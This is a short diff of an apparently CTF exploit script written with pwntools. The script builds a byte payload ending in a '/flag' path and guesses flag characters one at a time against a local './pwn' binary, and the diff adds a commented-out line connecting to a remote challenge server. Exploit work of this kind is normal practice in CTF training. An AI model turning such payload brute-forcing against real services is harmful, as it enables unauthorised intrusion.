@@ -21,7 +21,6 @@ def debug(gdbscript="", stop=False):
 
 import string
 
-context.log_level='info'
 
 flag=''
 idx=0
@@ -56,6 +55,7 @@ code += b'\x00'*183
 code += b'/flag'
 code = bytearray(code)
 newest='f'
+# context.log_level='info'
 
 while True:
     if newest == '}':
@@ -64,6 +64,7 @@ while True:
     for i in charset:
         code[67] = ord(i)
         io = process('./pwn')
+        # io = remote('47.113.197.7', 35018)
         io.recvline()
         io.send(bytes(code))
         try:
